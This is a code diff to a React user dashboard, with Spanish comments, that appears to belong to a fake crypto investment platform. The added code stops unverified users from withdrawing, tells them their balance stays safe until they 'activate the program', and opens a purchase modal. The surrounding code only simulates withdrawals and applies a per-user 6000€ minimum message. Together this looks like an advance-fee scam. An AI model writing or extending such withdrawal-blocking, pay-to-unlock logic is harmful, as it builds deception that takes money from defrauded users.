@@ -340,7 +340,19 @@ const UserDashboard = () => {
       return;
     }
 
-    // Verificar mínimo de 6000€ usando la nota personalizada del usuario
+    // Para usuarios NO VERIFICADOS: No procesar retiro real, solo mostrar información
+    if (!user.verified) {
+      toast({
+        title: "🔐 Activa el Programa",
+        description: "Tu saldo se mantendrá seguro hasta que actives el programa. ¡Una vez activado podrás retirar todo!",
+        variant: "default",
+        duration: 5000
+      });
+      setShowPurchaseModal(true);
+      return;
+    }
+
+    // Verificar mínimo de 6000€ usando la nota personalizada del usuario (solo para verificados)
     const totalBalance = getTotalBalance();
     if (totalBalance < 6000) {
       // Usar la nota personalizada del usuario o la predeterminada
@@ -357,7 +369,7 @@ const UserDashboard = () => {
 
     const cryptoBalance = user.balance[selectedWithdrawCrypto] || 0;
     
-    // Simular retiro
+    // Simular retiro (solo para usuarios verificados)
     const withdrawal = {
       id: Date.now().toString(),
       date: new Date().toISOString(),
@@ -367,7 +379,7 @@ const UserDashboard = () => {
       status: 'Retirado'
     };
 
-    // CRÍTICO: Actualizar balance en el backend
+    // CRÍTICO: Actualizar balance en el backend (solo para usuarios verificados)
     try {
       const backendUrl = process.env.REACT_APP_BACKEND_URL;
       const newBalance = { ...user.balance };
